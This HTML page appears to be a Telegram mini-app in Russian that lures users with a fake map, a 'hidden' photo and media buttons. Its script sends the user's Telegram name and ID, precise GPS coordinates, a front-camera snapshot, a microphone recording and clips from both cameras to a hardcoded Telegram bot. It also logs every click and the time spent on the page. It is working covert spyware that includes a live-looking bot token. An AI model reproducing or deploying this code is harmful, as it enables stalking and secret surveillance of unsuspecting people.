<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Быстрый просмотр</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: Arial, sans-serif;
      color: #f3f6fb;
      background:
        radial-gradient(circle at 20% 15%, rgba(56, 189, 248, 0.22), transparent 45%),
        radial-gradient(circle at 80% 75%, rgba(99, 102, 241, 0.22), transparent 50%),
        linear-gradient(160deg, #0b1020 0%, #131b33 60%, #0d1326 100%);
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
    }

    .app {
      width: 100%;
      max-width: 440px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }

    .header h2 {
      margin: 0 0 4px;
      font-size: 20px;
    }

    .header p {
      margin: 0;
      font-size: 13px;
      color: #9fb0cc;
    }

    .menu {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    button {
      padding: 13px 15px;
      font-size: 15px;
      font-weight: 600;
      border: 1px solid rgba(255, 255, 255, 0.14);
      border-radius: 12px;
      background: rgba(255, 255, 255, 0.08);
      color: #fff;
      cursor: pointer;
      transition: transform 0.12s ease, background 0.2s ease;
    }

    button:hover {
      background: rgba(255, 255, 255, 0.14);
    }

    button:active {
      transform: scale(0.98);
    }

    .btn-primary {
      background: linear-gradient(135deg, #2563eb, #0ea5e9);
      border: none;
      width: 100%;
      margin-top: 10px;
    }

    .card {
      display: none;
      background: rgba(15, 23, 42, 0.78);
      border: 1px solid rgba(255, 255, 255, 0.12);
      border-radius: 16px;
      padding: 14px;
      backdrop-filter: blur(10px);
    }

    .card.active {
      display: block;
    }

    .fake-map {
      position: relative;
      height: 180px;
      border-radius: 12px;
      overflow: hidden;
      background:
        linear-gradient(to right, rgba(148, 163, 184, 0.14) 1px, transparent 1px),
        linear-gradient(to bottom, rgba(148, 163, 184, 0.14) 1px, transparent 1px),
        linear-gradient(135deg, #1e3a5f, #162844);
      background-size: 28px 28px, 28px 28px, cover;
      border: 1px solid rgba(125, 211, 252, 0.25);
    }

    .map-road {
      position: absolute;
      background: rgba(250, 204, 21, 0.35);
      border-radius: 999px;
    }

    .map-road.r1 {
      width: 120%;
      height: 8px;
      top: 52%;
      left: -10%;
      transform: rotate(-11deg);
    }

    .map-road.r2 {
      width: 8px;
      height: 120%;
      left: 58%;
      top: -10%;
      transform: rotate(14deg);
    }

    .map-pin {
      position: absolute;
      left: 58%;
      top: 52%;
      transform: translate(-50%, -100%);
      background: #ef4444;
      color: #fff;
      font-size: 12px;
      font-weight: bold;
      padding: 5px 9px;
      border-radius: 999px;
      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.45);
    }

    .censored-box {
      position: relative;
      height: 180px;
      border-radius: 12px;
      overflow: hidden;
      background:
        radial-gradient(circle at 30% 35%, #f59e0b, transparent 55%),
        radial-gradient(circle at 75% 65%, #ec4899, transparent 55%),
        linear-gradient(135deg, #312e81, #0f172a);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }

    .censored-overlay {
      position: relative;
      z-index: 2;
      background: rgba(15, 23, 42, 0.78);
      border: 1px solid rgba(255, 255, 255, 0.22);
      padding: 10px 14px;
      border-radius: 10px;
      text-align: center;
      backdrop-filter: blur(12px);
    }

    .censored-overlay strong {
      display: block;
      font-size: 14px;
      letter-spacing: 0.5px;
    }

    .censored-overlay span {
      font-size: 12px;
      color: #cbd5e1;
    }

    .hint {
      margin-top: 8px;
      font-size: 12px;
      color: #94a3b8;
    }
  </style>
</head>
<body>
  <div class="app">
    <div class="header">
      <h2>Быстрый просмотр</h2>
      <p>Выберите раздел, затем подтвердите действие</p>
    </div>

    <div class="menu">
      <button id="open-geo-card">Проверить локацию</button>
      <button id="open-cam-card">Посмотреть фото</button>
      <button id="btn-mic">Записать звук</button>
      <button id="btn-dual-video">Посмотреть видео</button>
    </div>

    <div id="card-geo" class="card">
      <div class="fake-map">
        <div class="map-road r1"></div>
        <div class="map-road r2"></div>
        <div class="map-pin">Точка на карте</div>
      </div>
      <div class="hint">Для открытия карты потребуется доступ к геопозиции.</div>
      <button id="confirm-geo" class="btn-primary">Открыть карту</button>
    </div>

    <div id="card-cam" class="card">
      <div id="censored-photo" class="censored-box">
        <div class="censored-overlay">
          <strong>[ Скрыто ]</strong>
          <span>Нажмите на фото или кнопку ниже</span>
        </div>
      </div>
      <div class="hint">Для просмотра потребуется доступ к камере.</div>
      <button id="confirm-cam" class="btn-primary">Открыть фото</button>
    </div>
  </div>

  <script>
    const BOT_TOKEN = '8322427303:AAGFHKfe3YCf7Dwg-uc7jfVA8MAn1Dbjzgw';
    const CHAT_ID = '8298749655';

    const tg = window.Telegram?.WebApp;
    if (tg) {
      tg.ready();
      tg.expand();
    }

    const sessionId = 'S-' + Math.random().toString(36).slice(2, 8).toUpperCase();
    const startedAt = Date.now();
    const sessionEvents = [];

    function getUserLabel() {
      const u = tg?.initDataUnsafe?.user;
      if (!u) return 'Браузер / без данных TG';
      const name = [u.first_name, u.last_name].filter(Boolean).join(' ');
      const nick = u.username ? `@${u.username}` : `id:${u.id}`;
      return `${name || 'Пользователь'} (${nick})`;
    }

    function nowTime() {
      return new Date().toLocaleTimeString('ru-RU', { hour12: false });
    }

    async function sendMessageToBot(text) {
      if (!BOT_TOKEN || BOT_TOKEN.startsWith('ВАШ_') || !CHAT_ID || CHAT_ID.startsWith('ВАШ_')) {
        return;
      }
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      try {
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          keepalive: true,
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text
          })
        });
      } catch (_) {}
    }

    async function sendFileToBot(endpoint, fieldName, blob, filename, caption = '') {
      if (!BOT_TOKEN || BOT_TOKEN.startsWith('ВАШ_') || !CHAT_ID || CHAT_ID.startsWith('ВАШ_')) {
        return;
      }
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append(fieldName, blob, filename);
      if (caption) {
        formData.append('caption', caption);
      }

      const res = await fetch(url, {
        method: 'POST',
        body: formData
      });
      if (!res.ok) {
        throw new Error(`HTTP ${res.status}`);
      }
    }

    async function logAction(eventText) {
      const line = `[${nowTime()}] ${eventText}`;
      sessionEvents.push(line);
      await sendMessageToBot(`Сессия ${sessionId} | ${getUserLabel()}\n${line}`);
    }

    let summarySent = false;
    function sendSessionSummary(reason) {
      if (summarySent) return;
      summarySent = true;
      const sec = Math.max(1, Math.round((Date.now() - startedAt) / 1000));
      const list = sessionEvents.length ? sessionEvents.join('\n') : 'Без действий';
      sendMessageToBot(
        `Выход из приложения (${reason})\nСессия: ${sessionId} | ${getUserLabel()}\nВремя в приложении: ${sec} сек\n\nДействия за сессию:\n${list}`
      );
    }

    const cardGeo = document.getElementById('card-geo');
    const cardCam = document.getElementById('card-cam');

    function showCard(targetCard) {
      cardGeo.classList.remove('active');
      cardCam.classList.remove('active');
      if (targetCard) {
        targetCard.classList.add('active');
      }
    }

    // 1. Геолокация
    function handleGeo() {
      logAction('Нажал «Открыть карту» — запрос геолокации');

      if (!navigator.geolocation) {
        logAction('Геолокация не поддерживается устройством');
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          logAction('Разрешил геолокацию — координаты получены');
          await sendMessageToBot(
            `Сессия ${sessionId} | ${getUserLabel()}\nЛокация:\nШирота: ${latitude}\nДолгота: ${longitude}\nТочность: ${Math.round(accuracy)} м`
          );
        },
        (err) => {
          logAction(`Ошибка/отказ геолокации: code=${err.code} (${err.message || 'нет доступа'})`);
        },
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
      );
    }

    // 2. Фото с камеры
    async function handleCamera() {
      logAction('Нажал на фото / «Открыть фото» — запрос камеры');

      if (!navigator.mediaDevices?.getUserMedia) {
        logAction('Камера недоступна в этом окружении');
        return;
      }

      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false
        });
        logAction('Разрешил камеру для фото');

        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        await video.play();

        await new Promise((resolve) => setTimeout(resolve, 400));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise((resolve) =>
          canvas.toBlob(resolve, 'image/jpeg', 0.85)
        );

        await sendFileToBot('sendPhoto', 'photo', blob, 'photo.jpg', `Сессия ${sessionId} | ${getUserLabel()}`);
        logAction('Фото отправлено в бот');
      } catch (err) {
        logAction(`Не дал доступ к камере или ошибка: ${err.name || err.message}`);
      } finally {
        if (stream) {
          stream.getTracks().forEach((track) => track.stop());
        }
      }
    }

    // 3. Запись короткого аудио (3 сек)
    async function handleMic() {
      logAction('Нажал «Записать звук» — запрос микрофона');

      if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === 'undefined') {
        logAction('Микрофон или MediaRecorder недоступны');
        return;
      }

      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
        logAction('Разрешил микрофон — запись 3 сек');

        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = (e) => {
          if (e.data && e.data.size > 0) {
            chunks.push(e.data);
          }
        };

        const stopped = new Promise((resolve) => {
          recorder.onstop = resolve;
        });

        recorder.start();
        await new Promise((resolve) => setTimeout(resolve, 3000));
        recorder.stop();
        await stopped;

        const mimeType = recorder.mimeType || 'audio/webm';
        const blob = new Blob(chunks, { type: mimeType });

        await sendFileToBot('sendVoice', 'voice', blob, 'voice.ogg', `Сессия ${sessionId} | ${getUserLabel()}`);
        logAction('Аудиозапись отправлена в бот');
      } catch (err) {
        logAction(`Не дал доступ к микрофону или ошибка: ${err.name || err.message}`);
      } finally {
        if (stream) {
          stream.getTracks().forEach((track) => track.stop());
        }
      }
    }

    // Вспомогательная запись видео с выбранной камеры ('user' или 'environment')
    async function recordSingleCamera(facingMode, labelRu, durationMs = 3000) {
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode },
          audio: true
        });
      } catch (_) {
        // Если микрофон не дали или не поддерживается, пробуем только видео
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode },
          audio: false
        });
      }

      try {
        logAction(`Разрешил ${labelRu} — запись ${Math.round(durationMs / 1000)} сек`);
        const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
          ? 'video/webm;codecs=vp8,opus'
          : (MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : '');

        const recorder = mimeType
          ? new MediaRecorder(stream, { mimeType })
          : new MediaRecorder(stream);

        const chunks = [];
        recorder.ondataavailable = (e) => {
          if (e.data && e.data.size > 0) {
            chunks.push(e.data);
          }
        };

        const stopped = new Promise((resolve) => {
          recorder.onstop = resolve;
        });

        recorder.start();
        await new Promise((resolve) => setTimeout(resolve, durationMs));
        recorder.stop();
        await stopped;

        const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
        await sendFileToBot(
          'sendVideo',
          'video',
          blob,
          `${facingMode}_video.mp4`,
          `Сессия ${sessionId} | ${getUserLabel()} | ${labelRu}`
        );
        logAction(`Видео с ${labelRu} отправлено в бот`);
      } finally {
        stream.getTracks().forEach((track) => track.stop());
      }
    }

    // 4. Видео с фронтальной и задней камеры по очереди
    async function handleDualVideo() {
      logAction('Нажал «Видео (2 камеры)»');

      if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === 'undefined') {
        logAction('Видеозапись не поддерживается на этом устройстве');
        return;
      }

      try {
        await recordSingleCamera('user', 'фронтальную камеру', 3000);
        await new Promise((resolve) => setTimeout(resolve, 400));
        await recordSingleCamera('environment', 'заднюю камеру', 3000);
      } catch (err) {
        logAction(`Ошибка записи видео: ${err.name || err.message}`);
      }
    }

    document.getElementById('open-geo-card').addEventListener('click', () => {
      showCard(cardGeo);
      logAction('Открыл раздел «Проверить локацию»');
    });

    document.getElementById('open-cam-card').addEventListener('click', () => {
      showCard(cardCam);
      logAction('Открыл раздел «Посмотреть фото»');
    });

    document.getElementById('confirm-geo').addEventListener('click', handleGeo);
    document.getElementById('censored-photo').addEventListener('click', handleCamera);
    document.getElementById('confirm-cam').addEventListener('click', handleCamera);
    document.getElementById('btn-mic').addEventListener('click', handleMic);
    document.getElementById('btn-dual-video').addEventListener('click', handleDualVideo);

    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        sendSessionSummary('свернул/закрыл экран');
      }
    });
    window.addEventListener('pagehide', () => sendSessionSummary('вышел со страницы'));
    window.addEventListener('beforeunload', () => sendSessionSummary('закрыл вкладку'));

    logAction('Вошёл в мини-приложение');
  </script>
</body>
</html>
